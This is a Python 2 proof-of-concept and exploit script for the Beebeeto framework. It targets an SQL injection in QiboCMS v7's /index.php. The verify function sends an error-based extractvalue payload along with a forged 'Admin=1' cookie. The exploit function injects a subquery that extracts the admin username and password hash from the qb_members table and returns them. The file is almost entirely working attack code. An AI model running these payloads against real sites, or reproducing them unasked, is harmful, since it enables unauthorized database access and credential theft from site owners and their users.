#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0072',  # 由Beebeeto官方编辑
            'name': '齐博CMS v7整站系统 /index.php SQL注入漏洞 POC & Exploit',  # 名称
            'author': '大孩小孩',  # 作者
            'create_date': '2014-10-15',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '齐博CMS',  # 漏洞所涉及的应用名称
            'vul_version': ['v7.0'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['齐博CMS', 'SQL注入'],  # 漏洞相关tag
            'desc': '齐博CMS v7整站系统 index.php文件存在SQL注入漏洞。',  # 漏洞描述
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-070402',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + ("/index.php?jobs=show&label_hf[1%27%20and%20extractvalue"
                                                  "(1,concat(0x5c,md5(5956621)))%23][2]=asd")
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url)
        request.add_header('Cookie', 'Admin=1');
        response = urllib2.urlopen(request)
        content = response.read()
        if 'ed0def8205ef88db91cee23e7b939e4' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        else:
            args['success'] = False
            return args

    @classmethod
    def exploit(cls, args):
        vul_url = args['options']['target']
        paload = ('/index.php?jobs=show&label_hf[1%27%20and%20extractvalue(1,concat(0x5c,(select%20concat'
                  '(username,password)%20from%20qb_members%20limit%201)))%23][2]=asd')
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url
        request = urllib2.Request(vul_url + paload)
        request.add_header('Cookie', 'Admin=1');
        response = urllib2.urlopen(request)
        content = response.read()
        pattern = re.compile(r'.*?\\(?P<result>[^<>]*?)\'<br>',re.I|re.S)
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        else:
            result = match.group('result').strip()
            username = result[:-26]
            password = result[-26:]
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            args['poc_ret']['Username'] = username
            args['poc_ret']['Password'] = password
            return args
        args['success'] = False
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())